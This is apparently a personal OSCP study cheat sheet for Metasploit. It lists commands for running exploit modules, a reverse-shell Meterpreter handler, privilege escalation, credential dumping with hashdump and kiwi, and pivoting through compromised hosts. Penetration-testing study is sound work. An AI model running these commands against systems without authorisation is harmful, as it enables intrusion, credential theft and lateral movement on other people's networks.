# Metasploit

## Start
- [ ] On the OSCP exam Metasploit is allowed on one machine only: decide before I use it
The database, once on a fresh Kali:
sudo msfdb init
msfconsole -q
Inside msfconsole, a workspace for this box and a scan into it:
db_status
workspace -a <Hostname>
db_nmap -sV -sC <TargetIP>
hosts
services -p <Port>

## Run a module
search type:exploit name:THE-PRODUCT
search cve:THE-CVE
use THE-MODULE
info
options
show targets
show payloads
set RHOSTS <TargetIP>
set RPORT <Port>
set LHOST tun0
set LPORT <LPORT>
check
exploit
- [ ] Logins and paths the module asks for set too, from options
- [ ] check run first where the module has one
- [ ] The module's source read, under /usr/share/metasploit-framework/modules/, so I can repeat it by hand
- [ ] setg sets a value for every module; back leaves this one

## A handler for my own payload
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT <LPORT>
set ExitOnSession false
run -j
- [ ] PAYLOAD exactly what msfvenom built: the architecture, and staged with / or stageless with _
The same from Kali's shell, in one line:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT <LPORT>; set ExitOnSession false; run -j"
- [ ] Building the payload: :Pb msfvenom

## Sessions
sessions
sessions -i 1
background
sessions -u 1
sessions -k 1
- [ ] Ctrl+Z also backgrounds the session I am in
- [ ] sessions -u turns a plain shell into Meterpreter

## In Meterpreter
getuid
sysinfo
getprivs
getsystem
ps
migrate THE-PID
upload <File> C:\\Users\\Public\\<File>
download C:\\Users\\Public\\<File>
shell
- [ ] Backslashes doubled in upload and download paths
- [ ] A 64-bit Meterpreter in a 64-bit process before hashdump or kiwi: migrate if not
As SYSTEM:
hashdump
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

## Local exploits
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
- [ ] Each suggestion checked against the build and patches myself before I run it

## Pivot through a session
Routes to the networks the session's host can reach, then a SOCKS proxy over them:
use post/multi/manage/autoroute
set SESSION 1
run
- [ ] The route add line only when autoroute missed that network
route add <Subnet>/<CIDR> 1
route print
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
At the pwn-broker prompt: tool install netexec.
Kali's proxychains points at Tor's port; this makes it use the proxy instead:
sudo sed -i 's/^socks4.*9050$/socks5 127.0.0.1 1080/' /etc/proxychains4.conf
proxychains -q nxc smb <InternalIP>
One port on one host instead, from Meterpreter:
portfwd add -l <LPORT> -p <Port> -r <InternalIP>
